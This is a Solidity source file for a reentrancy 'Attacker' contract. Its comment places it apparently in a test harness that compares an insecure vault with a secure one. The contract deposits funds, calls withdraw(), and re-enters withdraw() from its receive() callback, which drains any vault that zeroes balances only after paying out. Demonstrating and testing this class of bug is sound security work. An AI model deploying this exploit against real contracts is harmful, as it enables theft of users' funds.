// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IVault {
    function deposit() external payable;
    function withdraw() external;
}

/// Reentrancy attacker. Deposits a single unit, calls `withdraw()`, and re-enters from the
/// `receive()` ETH callback while the vault still credits its (un-zeroed) balance — draining
/// the whole vault against the INSECURE target. Against the SECURE target the re-entrant
/// `withdraw()` reverts (balance already zeroed), so the attack nets nothing.
contract Attacker {
    IVault public immutable vault;
    uint256 public unit;

    constructor(address v) {
        vault = IVault(v);
    }

    function attack() external payable {
        unit = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= unit) {
            vault.withdraw();
        }
    }
}
